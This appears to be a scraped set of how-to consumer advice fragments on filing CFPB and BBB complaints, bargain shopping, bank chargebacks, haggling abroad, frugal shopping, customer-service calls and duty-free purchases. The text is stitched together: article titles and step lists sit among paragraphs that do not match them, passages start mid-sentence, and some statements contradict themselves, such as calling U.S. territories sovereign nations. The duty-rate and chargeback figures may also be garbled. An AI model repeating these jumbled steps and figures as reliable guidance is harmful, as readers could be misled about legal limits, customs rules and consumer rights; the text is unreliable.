, Created in 2010, the Consumer Financial Protection Bureau is the Federal agency charged with regulating the financial industry's practices as they relate to consumers. If you are being bombarded with offers for credit cards and you have already opted out using OptOutPrescreen.com, it is possible a bank is operating in violation of the Fair Credit Reporting Act. If they are, they need to be reported.Initiating a complaint with the CFPB is easy. Go to http://www.consumerfinance.gov/complaint/#credit-card, read the description of the process at the bottom of the page, and click ""credit card"" at the top to get started. Simply follow the directions from there.

, The Better Business Bureau (BBB) is a nonprofit agency funded by merchants and businesses for the purpose of standardizing and certifying best practices when dealing with consumers. The BBB also rates companies according to how closely they measure up to the standards.When you're ready to get started with your complaint, simply go to https://www.bbb.org/consumer-complaints/file-a-complaint/get-started and begin the process. You won't need any special information. Just provide the name of the company you're dealing with and describe what action you've already taken in order to find a remedy.

, Similar to the Federal Trade Commission (FTC) or the CFPB, individual states have offices of consumer protection. The procedures for filing complaints at the state level are usually similar to the procedures at the Federal level, although they may differ slightly.State offices of consumer protection can be found at https://www.usa.gov/state-consumer

Familiarize yourself with retail prices.,
Bargain hunt online.,
Use coupons.,
Check weekly ads.,
Shop on Tuesday nights.,
Be on the lookout for special discounts.,
Follow your favorite stores on social media.,
Learn sales cycles.",How to Bargain Shop1," If you want to be able to find bargains, you should be able to recognize a good deal. Therefore, before you go out shopping for an item, spend some time learning the usual retail prices.


You can easily use the internet to do some research before going out shopping. For example, if you're looking for a coffee table for your living room, browse furniture store websites for products with the size and design you want. Try to get a sense of how much this item normally goes for. If coffee tables seem to cost $125 on average, a store offering a table for a discount rate of $115 isn't saving you all that much. If you find a coffee table on sale for $70, you know that's a good deal.;
, Browse sites like eBay or Craigslist. See if anyone's offering a used table for a discount rate. However, you should take some precautions when using sites like this. Assess the condition of the product before making a purchase and always meet people you contact online in public first.

, Coupons are a classic means of bargain shopping. You can use traditional coupon cutting. Scan your local newspaper for coupons relevant to your shopping needs. Pocket any coupons you get at the register and use them later. You can also find somewhat nontraditional ways to enhance coupon discounts.


Stack coupons on top of in store sales. If a coupon does not say something like ""whole price only,"" aim to use it when the item in question goes on sale. This way, you can double the savings.You can potentially stack coupons as well. You can use coupons from the store in addition to coupons issued by a specific company. Just check store policy first. Some stores may have rules against coupon stacking.Some stores match competitor's coupons. It may be to your advantage to ask. This can save you a trip when shopping.If a store is out of a sales item, you may be able to get a rain check. You can show a cashier you had the coupon for an item that's out of stock. The store can reserve the item for you and sell it to you when they restock at the discount price, even after your coupon has expired., If you subscribe to a local newspaper, ads usually come certain days of the week. These may contain coupons for food and other products. Make a habit of clipping coupons relevant to your shopping needs and then bringing them with you when you run to the store. For example, may you could always make a point of checking ads the day before you're going shopping.

, It's fairly common for stores to mark down items on a Tuesday night. If you're looking to score sales, consider shopping in the late evening Tuesday. Sales items will be recently marked down and less likely to have sold out., Many people don't realize how many specialized discounts stores offer. There may be discounts for those in the military, as well as college students and the elderly. There are also occupational discounts. For example, some stores may offer a 10% discount for teachers. Ask about special discounts when checking out. You may be surprised to find some apply to you., Stores often post about upcoming sales and discounts on social media accounts. Following a variety of your favorite stores on Twitter and Facebook can help you spot sales early on., While Tuesdays are common to mark down items, stores do have independent sales cycles. If possible, it's best to learn the specific sales cycles for your favorite stores. This way, you can plan to shop during times when you'll find the most discounts.


You might have to do some trial and error to figure out sales cycles. Try to take note of when sales items appear. If you notice your local Gap seems to suddenly have marked down items Thursday afternoons, they may transfer items to discount prices on Wednesday nights. This may be the optimal time to shop. If you have a friend that works in a store you frequent, try asking him if he knows the sales cycle.There are some general rules that can guide you as well. For example, many retailers move certain items to clearance or sale after six months. If you can hold out on buying that new set of curtains for a few months, it might be worth waiting to see if it moves to clearance.If you search for discounts at thrift stores, shop early in the week. Most people who donate to such stores do so on the weekend. Therefore, Mondays and Tuesdays are your best options for heading to thrift stores as there will be the most variety."

Ask what guarantees and/or returns policies there are.

, Don't just assume it's all good on the outside.

Compile evidence of your complaint.,
Make an effort to resolve the situation with the merchant or vendor.,
Find out your bank's chargeback policy.,
Call your bank to initiate a chargeback.,
Complete any bank forms sent to you.,
Wait for the bank's decision.",How to Dispute Bank Charges2," Since chargebacks typically involve the receipt of faulty or defective merchandise, you typically must provide proof of the transaction amount as well as evidence that the product you received was defective.

This federal protection only extends to purchases over $50, and the sale must have taken place in your home state or within 100 miles of your address.
Some banks and credit card companies may offer chargeback protections for other transactions, such as online sales, beyond those covered by federal law.

, Use the chargeback process as a last resort after the company refuses to issue you a refund.Typically you must be able to demonstrate to your bank or credit card company that you made a good faith effort to work with the merchant to solve the problem before you initiated a chargeback.
Sometimes this option isn't possible. For example, if you ordered a product from a website and the website was later taken down, you may have no way to contact the company from which you bought the product.
Provided you can, contact the company where you bought the defective product and ask for a refund. Make your request in writing so you have proof of the exchange. Attach any evidence you have regarding your problem with the product.
Generally, you should begin collecting documentation of the dispute as soon as you have an idea that something is wrong. The more documentation you have, the more likely your bank will be to side with you., Banks may have different policies for handling chargebacks, depending on whether you made your purchase using a debit or credit card.


Since federal law does not give you the right to withhold payment for defective goods purchased with a debit card, you are at the mercy of your bank's policy regarding whether you can initiate a chargeback if you paid with a debit card., Typically you can call your bank's main customer service number to begin the chargeback process.Follow the prompts to dispute a transaction or talk to a customer service agent, and explain that you want to initiate a chargeback due to a defective product.
These deadlines are the same as those for billing errors. You must notify the bank within 60 days of the transaction if you want to initiate a chargeback., After receiving your request, the bank will send you forms to fill out detailing the transaction and the reason you're requesting a chargeback.Typically you must enter details about the transaction, including the date and amount of your purchase, and describe why you want to refuse payment.
You may have to include receipts, photos, or other evidence to back up your claim.
You also may have to explain the methods you pursued to resolve the problem with the merchant before attempting a chargeback, or why those methods were unavailable or ineffective.
Keep your answers brief, and stick to the facts. Make sure you have documentation to back up any statements you make on your claim form.

, Once the bank hears back from the merchant, it will make a decision either approving or denying your chargeback request.Just as with billing errors, the bank has two billing cycles to respond to your claim and either return the funds to your account or explain why your chargeback is being refused."

Have a separate e-mail for coupons.,
Make a list.,
Set a budget.,
Shop when you're in a good mood.,
Set a timeframe for shopping.,
Pay with cash.,
Shop alone.",How to Bargain Shop2," When you're checking out, the cashier often asks for your e-mail. This is so the store can send you coupons and updates on sales. However, these e-mails often get lost in your regular e-mail. Create a separate e-mail address to give out at the register. Check this address when you're planning a shopping trip.

, It's a simple change, but sometimes making a list can help you bargain shop. Try to make a list of the items you actually need before going on a shopping trip. Then, stick to that list strictly. You may end up overspending on impulse purchases without a list. Whether you're grocery shopping, clothes shopping, or shopping for anything else, write out what you need ahead of time., You're more likely to seek out bargains if you have to find a discount. If you set a strict budget for yourself, and make sticking to it a priority, you'll end up buying cheaper items. This can also help prevent impulse buys.


It's fairly easy to make a budget. To start, write down your total monthly income. From there, subtract necessary expenses like cost of living and any monthly bills. The amount that you have left is how much you can reasonably spend on extras throughout the month.
From here, break down how you spend money into categories. Jot down things like food, entertainment, clothes, and so on. You can then choose a reasonable budget for how much you should aim to spend on each category.
Stick to your budget, even if it's hard at first. If you budget $200 a month for food, do not go over that budget. While ordering takeout after a stressful work day might seem tempting, if it's not in your budget it avoid it., Many people don't realize they'll be more adept at bargain hunting if they shop in the right mindset. Shopping when you're stressed or tired could lead you to make quick purchasing decisions instead of looking for the best price. Shopping when you're hungry could lead you to stocking up on cheap convenience food over something substantial. Make sure you're in a good mood before going shopping. If you're feeling stressed, tired, or hungry, take some time to unwind and eat before heading out the door., Oftentimes, simply setting a timeframe can make a big difference in your purchasing decisions. If you give yourself an endless amount of time at the supermarket, you're more likely to wander through the aisles browsing. Browsing can lead to impulsive and regrettable purchasing decisions. Set a timeframe for yourself and stick to it. Give yourself, say, an hour in the grocery store to grab your items and head out.However, one caveat is that you shouldn't limit your time too much. If you don't give yourself enough time to shop, you may start to feel stressed out or otherwise pressured. Remember, a bad mood can also lead to impulse buys. Time how long you would normally spend at the grocery store when sticking to your list. This will help you gauge what a reasonable timeframe is. Give yourself about that much time to shop as a rule.

, People tend to spend less money when they're paying in cash. You think less about how much money you're spending when you're paying with a card. Cash forces you to acknowledge how much you've spent. Withdraw money from your bank account before a shopping trip. Try to pay in cash as much as possible.Keep in mind paying with cash is not always possible. If you're going to be making a purchase well over $100, you may want to use your card. It can be dangerous to travel with that much cash on you.

, Shopping with another person can be risky. You may talk one another into buying items you do not really need or want. With clothes shopping especially, a friend might love a particular blouse on you and convince you to buy it. You may regret this down the road if you felt lukewarm about the garment. If you want to bargain shop, it's best to head to the store alone.However, one exception is if you have a friend who's particularly good at finding discounts or using coupons. You may actually want to take a friend like this shopping a few times to get the hang of hunting for bargains.

Shop at discount and sales stores.,
Shop off-season.,
Buy secondhand clothes.,
Choose quality items.,
Ask for a discount.",How to Bargain Shop3," If you want to save money on clothes, look into discount or sales stores. At such stores, you can often find slightly damaged or out of season designer outfits sold at a discount rate.


There are many discount stores, like T.J Maxx and Marshall's, that offer discount prices on designer outfits. There are also a lot of online outlets that offer discounts on certain clothing items.Be careful when shopping online. You may dislike the way a certain clothing item looks on you after trying it one.

, If you plan ahead, you can save a lot of money by shopping off season. A swimsuit may be on sale in February, for example, if you live in a warm area. Be on the lookout for items you know you need. If it's finally spring, but you noticed your winter coat was getting a little shabby, keep your eyes peeled for discount coats during the early spring months., Thrift stores and consignment stores are excellent means to find cheap clothing items. Oftentimes, high quality items are sold for incredibly low rates. You don't always find exactly what you're looking for at such stores as items are not sold in multiple styles and sizes. However, if you make a point of periodically checking your local thrift store you might find some low price clothing items you need., Spending a little extra money now on quality might translate to saving in the longterm. If you're going to wear an item a lot, like a pair of pants for work, it might be worth it to spend an extra $10. Items made with higher quality materials are less likely to wear down. Therefore, they need to replaced less frequently. If you're going to be wearing an item a lot, go for a higher quality.


You should also strive to care for your best clothing items. Fold delicate clothing instead of hanging it and do not wash your nice clothes too often. You can stand to re-wear the same shirt a few times, especially if you weren't doing anything physically demanding that day., Sometimes, you can get a discount by simply asking. If you notice a zipper is broken, a shirt is slightly stained, or some other minor flaw, try asking for a discount at the register. Most companies are more interested in fostering positive relationships with customers than making an extra $5 or $10. If you ask for a discount, there's a good chance you'll get one."
"
Create a menu.,
Plan meals around sales items.,
Buy certain items from dollar stores or drug stores.,
Buy certain sales items in bulk.,
Be careful with 10 for $10 sales.",How to Bargain Shop4," One of the easiest ways to bargain shop for food is to simply make a menu for yourself each week. Then, try to stick to purchasing food items off your menu.


Include ingredients you'll need to make dinner each night. Try to keep it simple, like grilling up some chicken and vegetables.You should also plan for breakfast, lunches, and snacks. This way, you'll avoid the temptation to eat out for your lunch break., Incorporate sales items into your meal planning. If a particular item is on sale that week, consider making a meal with this item. Watch for ads in the local paper and online to see what will be offered for a discount price.


You can also look for substitutes that are on sale. For example, say you're making a soup that requires chicken broth. If vegetable broth is on sale, consider buying that and substituting it for chicken broth. Swap out ingredients for discounted items whenever possible., There are certain items you may be better of buying at dollar stores or drug stores. Milk, for example, is generally cheaper at a drug store or gas station than at a grocery store. Non-food items you may frequently purchase at the grocery store, like toilet paper and paper towels, can be bought for cheap at a dollar store., If a non-perishable item goes on sale, buy it in bulk. If you see cereal is marked way down, for example, stock up on 10 boxes or so while you have the chance. If items will take awhile to expire, it makes sense to buy them in bulk when they're on sale rather than paying full price for a replacement in a week., Many stores offer 10 for $10 sales, but be wary when you see items marked like this. This is often a trick to get you to spend unnecessarily. These sales are often not particularly good deals. If an item is normally 90 cents, a 10 for $10 sale isn't really a steal. When you incorporate sales tax on the original price, you're paying around the same amount."

Don't be afraid to walk away from an item, even one that you love.,
Be prepared to spend a long time bargaining.,
When the seller announces his final offer, don't take the bait (optional).,
When the vendor gets to a price you like, stop.",How to Bargain," Not all situations call for bargaining. A bazaar in Morocco may be a great place to bargain, but Harrod's in London probably isn't. What's acceptable is one place is bad shopping etiquette in another.


If you want to know whether it's acceptable to bargain, say something casual like ""It's just a little too expensive for me."" If the merchant makes a counteroffer, he's effectively opening the door to bargaining, in which case, haggle away. If he stands pat, it's probably not okay to bargain at that location.;
, In most places where haggling or bargaining is common, there's a double standard when it comes to the price tag: What locals pay is often far less than what tourists pay.


Even if you find that an alpaca scarf costs 60 Peruvian nuevo sol for locals but 100 nuevo sol for tourists, don't necessarily expect to be able to bargain down the price of the scarf to 60 nuevo sol. Many vendors won't sell the ""locals"" price to tourists out of principle, although you may be able to get pretty close if you're skilled.

, This is a tried and true shopping rule that applies to buying things in general. But it especially applies to bargaining. Many bargainers think that if they can cut the price in half, they've gotten a good deal. But many vendors simply triple the first offer in anticipation of this, which means you'd technically be getting a bad deal if you were to buy. If you know what the item is worth to you, it doesn't really matter how the vendor prices his or her item — as long as you're happy with the price paid.

, In many places where it's common to bargain, cash is king. Vendors either won't accept credit cards or will be displeased about them. There are a couple benefits to carrying cash instead of opting for credit:


You won't be enticed to splurge on an item because you'll be limited by how much cash you have.Budget ahead of time and you're guaranteed to stick to your budget.
Reaching out with a handful of cash and exclaiming ""It's all the cash I have"" is a good trick that often works. Vendors will be tempted to go ahead and grab the cash in exchange for the item.

, By definition, you got your money's worth. If the vendor you're bargaining with refuses to go down to the price at which the item is valuable to you, it should be easy to walk away.

, One of the biggest mistakes people make is telegraphing their fondness for an item. As soon as the vendor knows you like something, he has the upper hand in the negotiation. On the other hand, if he believes you're on the fence for the item, you have the upper hand because you can always walk away, or at least pretend to walk away.

, A good rule of thumb is to take whatever the first offer is, quarter it, and begin the bargaining process there. Hack off a half from the first offer and you risk insulting the vendor. Hack off only 10% and you're less likely to get a killer deal.

, This trick works better than you might think at delivering the message that life's other responsibilities could easily get in the way of the sale. Here's what you do:


Have a friend with you while you bargain. If they pretend to be bored, worried you're spending too much money, or who has an appointment to catch, the vendor could cut straight to the chase and offer you near the lowest or the lowest offer., You'll get the lowest offer, or near the lowest offer, by being prepared to walk away. As soon as you walk away, the vendor loses the sale, and people all over the world hate to lose sales. They should offer you one of their lowest prices.

, It's not unheard of to spend hours haggling about price. Vendors in a position to bargain draw out the process because they understand that many people are simply impatient and are willing to pay more for the convenience of getting the item and being done with it. Vendors can feign embarrassment, disappointment, and insult throughout the bargaining process, using emotion to draw the bargaining to an end. Don't bite. Keep steady and you should get near the price you were looking for. The bargaining process might look something like this:



Seller: ""That'll be $50, ma'am.""
Buyer: ""I'll give you $20.""

Seller: ""How about $45?""
Buyer: ""How about $20?""

Seller: ""Fine. I'll be willing to settle for $35.""
Buyer: ""And I can settle for $25.""

Seller: ""$30?""
Buyer: ""$25.""

Seller: ""I will take $27 dollars.""
Buyer: ""And I will give you $26.""

Seller: ""$27 dollars is my final offer.""
Buyer: ""And $26 is mine.""

Seller: ""$26.50?""
Buyer: ""$26.""

Seller: ""$26 it is, then, ma'am.""

, This usually isn't the final offer. They may be trying to convince you that that is as low as they'll go. Tell the vendor your final offer, which should be $1-10 below, and work together from there. If that doesn't happen, walk away. He'll call you back and give you a killer deal. After all, to him, although $50 is better than $26, $26 is better than $0.

, Don't push it, or you'll ruin the whole deal. Take your item and go. Be pleased with your new acquisition and the knowledge that you can bargain with the best of them!

Shop around.If you are going to a marketplace, you might find several stalls selling the same (or a very similar) item.,
Consider bringing a friend with you.,
Negotiate the seller down to your price.,
Continue negotiating until you agree on a price.",How to Haggle1," Different countries have difference cultures. Some of their customs might be similar to your own, while others may be strikingly different. Take time to familiarize yourself with the culture of the country you are visiting. In some places, haggling is expected and encouraged for everything, while others are more restricted.


In general, most posted prices tend to be final. Haggling is less likely to be successful.If you see two prices listed—one in English and one in the local language—take note of the currencies and exchange rates. If the values are different, consider haggling for the lower price.
Sometimes, it is inappropriate to haggle for certain items. For example, in some countries, it is acceptable to haggle taxi prices, but not acceptable to haggle food prices.;
, If you are visiting a foreign country, the dominant religion might be different from your own. Some vendors may close specifically for a holiday, while others for prayers. Do not disrupt a person while he or she is praying, and do not get angry if a vendor closes due to a religious holiday.

, What may be considered polite in one place may be considered rude in another. Before you go haggling, take time to study the culture. This will prevent any unexpected surprises. It will also prevent you from accidentally insulting a vendor. For example, in many Middle Eastern and Islamic countries:


Handshakes are important. They are always done with the right hand. It is also rude to break a handshake. If a vendor initiates a handshake, wait for him or her to break it, no matter how long it takes.The interactions between men and women can be different. If you are male, and the vendor is female, do not initiate the handshake. Wait for her to extend her hand, if at all. Avoid making extended eye contact with her., If you are rude, people might be less willing to negotiate with you. If you are polite and respectful, however, the vendor may be more willing to haggle and negotiate a lower price. Consider learning a traditional greeting (and response) as well as a ""thank you"" before you visit a marketplace, or anywhere where there might be haggling. Even if you cannot say anything else in the vendor's language, he or she may see that you are trying and respect you for it.If you are a beginning language student, consider using the local language's words for numbers even if you can't carry out a full conversation.

, If you're in a much poorer country than your own, locals may expect you to pay higher prices. Chances are you won't be able to hide this, especially if you aren't fluent in the local language, but try to minimize flashy foreign clothing and expensive accessories.

, This is when sellers are preparing to leave and eager to offload stock.Ask a local for any regional exceptions they might know about. For example, in the city of Chiang Mi, Thailand, some vendors may be willing to provide a good bargain for the lucky first sale of the day., Take note of the price differences between the items. If one vendor's price is higher than the marketplace average, take note of the item's quality. There might be a reason why it is a higher price. For example, real fur items tend to be more expensive than fake fur items. If the price is the only difference, then you may try to haggle for a lower price that falls within the average range. The vendor might even offer up a lower price.

, Try to bring a friend who has lived in that country for a long time, or is familiar with the culture and customs. Not only might this make negotiating prices less intimidating, but any conversations and input from your friend might influence the vendor's final price. Don't be afraid to hold conversations with your friend over the item's value—just remember to keep it respectful. You don't want the vendor to refuse to sell the item to you., Decide what you're willing to pay secretly, then bargain the seller down to that amount with offers and counteroffers. For example, you can begin by offering to pay half the price listed. The vendor will likely offer a higher price than what you offered, but still lower than the original. If this still seems unfair to you, don't be afraid to disagree, make a face, or act disappointed. The vendor may lower the price to keep you happy and to sell the item.Here are a few more tips:


Choose a price in your home currency, then translate it (roughly) into the currency you're using. It's easy to get used to local prices, but don't let a high or low exchange rate trick you into turning down a good offer or paying more than you'd like.
You can make a much lower offer than the listed price if you are sure the price is inflated for foreigners. Let the seller know you know and they might give it to you for the local price.
The correct counteroffer may vary depending on the area you are in. If you can, ask a local beforehand what seems reasonable. If you have to guess, never offer below 50% of the initial price.

, Once it's at a price you're willing to pay, purchase the item and thank the seller. In order to achieve that price, you might need to resort to the following tactics:


Showing hesitation or remaining silent can cause the seller to respond with a better offer. But in some cultures, this can be interpreted as a sign of disinterest. If they start turning away, immediately start talking again—but you don't need to raise your offer right away.
Agree to their last offer on the condition they throw in another item you're interested in for a reduced rate.Have a friend pretend to pull you away or convince you to move on. This may trigger a final offer from the seller.If you don't have a friend handy, simply start walking away for the same effect. Once you try this, though, you may not get a better deal if you walk right back to the stall.
Pull out the amount of cash you're offering and show it to the seller to tempt them directly. Don't try this with what is considered large amount of money in that country. This may put you at risk for mugging or pick pocketing later on."

Buy on clearance.,
Do your research.,
Use internet sites.,
Go to yard sales.,
Shop at thrift stores and flea markets.,
Collect and use coupons.",How to Be a Frugal Shopper1," This is especially true for seasonal products. If you want to save the most money, buy winter coats and boots in the spring and swimsuits and summer wear in the late fall or winter. Buy school products about a month or so after school has started, and holiday products just after the holiday. Other clearance should be determined on a case-by-case basis. Remember you’re not really saving money, if you’re buying a lot of things on clearance that you won’t use or don’t need.For instance, a great time to stock up on wrapping paper is just after Christmas.;
, You can go to price comparison websites, and for common items such as video games or DVDs, you can go to sites like Amazon and Barnes and Noble to see what they're selling for on there. There are sometimes big sales that come once or twice a year like Black Friday or Cyber Monday. These are the times to research a good bit beforehand if you know you want a certain item for less.


Research what the products are going for online, and how much similar products are going for. Doing so will save you money when you don’t opt to buy the video game system that hasn’t been discounted enough to meet your budget, or when you can get one more cheaply online., Oftentimes you’ll get a better deal on Craigslist, or other online classifieds, because many people just want to get rid of their stuff and don’t mind selling it for less than half its retail value. Overstock is also a great resource for finding cheaper products. Again you’ll need to do cost-comparison research before buying, but it can be worth your while to surf Craigslist or Amazon before buying a product in-store. This is especially true for bikes, appliances, furniture, and exercise equipment.Be careful of your safety when buying products on sites like Craigslist. Never meet a seller alone. Go during normal daylight hours. Avoid secluded areas.Don’t forget to browse the “free” section on Craigslist occasionally.

, This is especially useful for saving money on furniture, tableware, and clothing. Often items will be even cheaper than they are on online classifieds, simply because people often want to get rid of their stuff. Try moving sales for the best prices on furniture and large appliances. Shop later in the day or the second day of the sale to get the lowest prices, but be aware that the selection will be smaller then.Be sure to check for damage, and if possible for electronics, ask if you can test it. For clothing, ask if you can try it on.
Typically, you can't return something to a yard sale if it doesn't work or you don't like. People aren't obligated to buy the product back from you.

, These stores often carry products at very reduced costs. They may not be as cheap as at a yard sale. Typically the clothing will cost more at a thrift store than at a yard sale, but furniture prices can be equivalent or even cheaper.If you really want to save money, avoid the boutique or “nicer” thrift shops, as they will often sell products at only a slightly discounted cost. However, if you’re looking for designer wear, these may still have the discounts you’re looking for., Coupons are available everywhere from newspapers and magazines to downloadable ones online. However, be sure to only collect coupons for things that you need, you won’t save money if you use coupons to buy things that you wouldn’t normally use. You'll want to compare prices between brands before you assume a coupon saves money."

, Calling up and rolling off ten things that need quick resolution is a guaranteed way to get people to tune you out. Only one issue can really be addressed at a time, so you're better off making a follow-up call once customer service is on your side and you have a contact person with whom to address other issues.

, Overstating a problem is usually very obvious to customer-service personnel, as they deal with the same issues day after day. Outright lying doesn't get you very far either once they start asking questions. A far better strategy is to express a real sense of urgency: “I’m going out of town."" ""I really feel helpless in this situation."" ""I really need your help."" Expect an empathetic response in return.

, You want to be someone whom people want to help. The other party does have the resources to help if s/he wants to. An honest, polite, straightforward request for help, when clearly expressed, should bring the result you want. It's really in the other party's long-term interests to give you satisfaction.


Introducing negativity usually doesn't help. Keep things light, friendly and calm. Simply address the issues.

, When a solution has been agreed to, give the other party ample time to implement it, and then call back to verify that it’s been done. If they've honestly and fairly assisted you, they’ll be glad to speak to you again to give you the good news of your problem’s resolution. If that hasn't happened, enter into further discussion for resolution.

, Don't merely assume they know what you want. Sometimes it has to be spelled out. Offer your own solution, or let them describe one. They may understand factors you're not aware of.

, Take note of whom you spoke to and when, and what was discussed. When dealing with more than one representative, this will make things easier for you. Most customer-service personnel will gladly give you their name, phone number, even an e-mail address.

, Communicate in a professional manner. You’ll be treated professionally in return.

, You want positive things to happen in your interaction with customer-service representatives. It’s their job to help, so unless you give them a reason not to, you have every right to expect a positive outcome.

, When following up, give praise and thanks if you feel they're deserved. A simple ""thank you"" -- like a smile -- goes a long way and costs you nothing. It also encourages the other party to continue helping you.

, There's usually a procedure to follow. Learn about that process, know the time frame, and allow the other party to follow through. Calling back too soon may cause bad feelings and bad results. If a reasonable amount of time has passed without hearing from them, you can follow up with a call to encourage them to redouble their efforts on your behalf.

, Don't ask for a steak dinner to replace your burnt burger. It’s fair to inquire about what’s reasonable and practical. The framework of most companies will accommodate this.

, Avoid ""no"" people. A ""yes"" person is someone who has the power and ability -- even the inclination -- to say ""yes."" A ""no"" person is someone whose job it is to say ""no"" and couldn't give a ""yes"" even if they wanted to.


Simply ask if they have the ability and authority to solve your problem. If not, ask for the person who does.
You’ll find that real ""yes"" people are the hardest people to reach in any organization. Companies typically have a financial interest in saying ""no."" Don’t give up. Try to get names and contact information for these ""yes"" people and learn the best way to reach them.

, If all else fails, go out and watch a sunset and restore some inner peace. A relaxed state of mind goes a long way in resolving problems.

Find a duty-free store.,
Determine if it's worth buying duty free.,
Bring your purchases with you.,
Determine a country's eligibility for unaccompanied purchases.,
Make purchases without exceeding your allowance.,
Ship your purchases from an eligible IP or CBI country.,
Leave the country.,
Make purchases within your allowance.,
Pay Customs duty on anything exceeding your allowance.",How to Buy Duty free," The first step to buying an item duty free is to locate a duty-free store. Duty-free stores can typically be found at any location that caters to or serves international travelers. Common locations for duty-free stores include international airports, towns and cities along an international border, cruise ships, ports, and on board certain international flights., Some of the discounts you get at a duty-free store make it well worth your time and effort to make a purchase. However, other items may not be sold at a very good rate. For many items, you may be able to get a better deal by simply looking for those products on sale at a regular retailer.The duty-free rate also depends on the country whose products you are attempting to import. For example, in the U.S., certain items imported from Austria, Belgium, Denmark, Finland, France, Germany, Greece, Ireland, Italy, Luxembourg, the Netherlands, Portugal, Spain, Sweden, and the Ukraine are subject to a 100% rate of duty.Alcohol and tobacco are generally the best discounts you'll find at a duty-free store.
Cameras and electronic products are usually not a very good deal.
Retail items like cosmetics, clothing, and perfume can be hit or miss in terms of their value. If an item wouldn't normally be on sale at a regular retailer, you may get a deal, but otherwise it might be cheaper to look for these items on sale at a regular retail outlet.
Candy and other confections are usually worth purchasing duty free if they are imported. However, regular candy that you can purchase at a supermarket is usually not a very good deal, and may actually be sold at an inflated price if you're buying at an airport duty-free store.

, Duty/tax breaks are only applicable on products that will not be consumed or used while in that country. You generally have to take your purchases with you into the country you're visiting in order to ensure that you do not consume/use your purchases domestically.Many duty-free shops deliver your purchases to you as you physically leave the country.
Your items may be delivered to you as you board a plane or as you drive across an international border.

, Certain countries are eligible for unaccompanied purchases made by tourists. Unaccompanied tourist purchases simply means products that are bought by a tourist and then shipped through the postal service or a transportation service to the home of that tourist.Countries eligible for duty-free shipping back to the U.S. are categorized as either insular possession (IP) countries or Caribbean Basin Initiative (CBI) countries.
IP countries are sovereign nations that are considered U.S. territories (excluding Puerto Rico). These include the U.S. Virgin Islands, American Samoa, and Guam.

, You are still subject to limitations on how much you can purchase when you ship items as an unaccompanied purchase. These items also count towards your overall allowance limits, so keep track of what you purchase and make sure you can account for those purchases when you fill out the necessary declaration paperwork.If returning to the U.S., you may bring up to five liters (169 fluid ounces) of alcohol as part of your allowable $1,600 exemption if at least four of those liters were purchased in the IP country and at least one of those liters was a product of that IP country.
You may bring up to $800 in goods duty free if returning to the U.S. from an eligible CBI country.Only one bottle purchased in a cruise ship's duty-free store would be exempt from taxes. However, you may be allowed to bring back two bottles duty free if at least one of the bottles was the product of an eligible CBI country.
Any additional bottles of liquor would be subject to a 1.5% flat duty rate, as well as additional Internal Revenue Service (IRS) taxes.

, If you are visiting an eligible IP or CBI country, you will be able to ship certain products back to your home if you live in the U.S. In order to do so, you'll need to fill out a Declaration of Unaccompanied Articles form for each package you wish to send. You'll also need to complete a separate declarations form, CBP Form 6059B, which lists any items you purchased that you are bringing back with you. Some retailers offer these forms in store; if not, you can download and print them from the CBP website. Be aware that all mailed packages must be claimed within 30 days of arriving in the U.S. Anything unclaimed after 30 days will be returned to the sender.Ask the merchant to hold your item at the time of purchase. Let him/her know you will send a copy of the Declaration of Unaccompanied Articles form, also known as CPB (Customs and Border Protection) Form 255.
Fill out a separate CBP Form 255 for each individual package/container you'll be sending back to the U.S., which will then have to be attached to the package before shipment.
Pay any Customs duty and taxes you may owe upon returning to the U.S. A CBP officer will also verify your list and validate your form(s).
Send the yellow copy of CBP Form 255 to the vendor who is holding your purchase. Keep the other copy you're given by CBP for your own records.
Once your package clears Customs, the U.S. Postal Service will be delivered to your home (if you are shipping it through the USPS). If you're using a transportation service, you will be notified when your package arrives, and you'll be able to claim it at their office.

, You must leave the country in order to qualify for duty-free shopping, often for a minimum span of time. In the United States, for example, you must leave the country for at least 48 hours if you wish to take full advantage of U.S. duty-free stores.However, you may be able to purchase some quantities of duty-free goods if you're traveling for less than that time span. U.S. citizens may purchase a reduced quantity of duty-free goods if they've spent less than 48 hours in Canada, for example, and Canadian citizens may purchase a limited quantity of duty-free goods after any length of time in the United States.U.S. citizens traveling to Canada for under 48 hours may bring back up to $200 (U.S. Dollars) worth of goods per person without paying taxes or duties. However, alcohol and tobacco may be subject to duties and taxes if it was purchased on a brief trip.
U.S. citizens who spend more than 48 hours in Canada may bring back up to $800 in goods per person, and will not have to pay taxes or duties on up to one liter (33.8 fluid ounces) of alcohol, one carton of 200 cigarettes, and 100 cigars.

, You may purchase up to the legal amount of goods in the duty-free store, though that amount will vary depending on where you are traveling and how long you will be gone. Product limitations are generally applied to high-tax items like alcohol and tobacco, though an overall limit is usually in place at most international borders.Most product-specific limitations restrict travelers to bringing back one liter (33.8 fluid ounces) of alcohol and one carton of cigarettes per person per trip.
At the U.S./Canadian border, individuals may only bring up to $800 in goods per month.
If you and one or more family members who reside at the same address travel together, you can collectively bring a total of $1,600 worth of goods per month per household.

, You may exceed the allowance of goods you're able to bring back duty free. However, you will have to pay taxes/duties on those goods that exceed your allowance. How you pay will depend on where you live and what payment methods are at your disposal.You can pay in cash, but it must be in the currency of the nation whose Customs office you are dealing with. For example, if you're a U.S. citizen crossing from Canada back into the U.S., you'll need to pay the U.S. Customs office in U.S. currency.
You can write a personal check for the exact amount of your Customs duty, provided you have a bank account within that country. For example, a U.S. citizen may make a personal check payment to the U.S. Customs office if he/she has a U.S.-based bank account.
If making a payment by check, you will need to provide an authorized photo ID (typically either a passport or U.S. driver's license).
You may also make a Customs payment by money order or traveler's check if the total you owe is below a certain amount. At the U.S. border, for example, that amount is set at $50.

Dress down.,
Arrive at the end of the day.,
Secretly decide on a maximum price.,
Make a low but reasonable offer.,
Show hesitation before responding to their counteroffer.,
Continue negotiating until you agree on a price or the seller balks.",How to Haggle2," You don't need to go out of your way to look ratty, but avoid obviously expensive clothing. Chances are you'll be negotiating over cheap items, and a fancy suit or dress tells the seller you can afford to pay full price.Don't forget to remove flashy jewelry and watches for the same reason.

, In the last hour or two before they pack up and leave, sellers will be eager to get rid of their remaining merchandise The flip side of arriving late is a smaller selection. For maximum choice (but higher prices), arrive early.
If the flea market is seasonal, the time of year can also have an effect on the price. When the flea market has just opened, sellers will have a large inventory from the off-season and may be eager to offload it so they have room to obtain more desirable goods.

, Once you've found your item, decide to yourself what you're willing to pay for it. Having a clear boundary will prevent you from being convinced to pay more than you are willing.Never reveal this price to the seller! If you do, he has no reason to offer you a lower one.
You can try browsing around first to get an idea for how similar items are selling, but there's no guarantee you'll find anything comparable, and the item may be snatched up in the meantime.

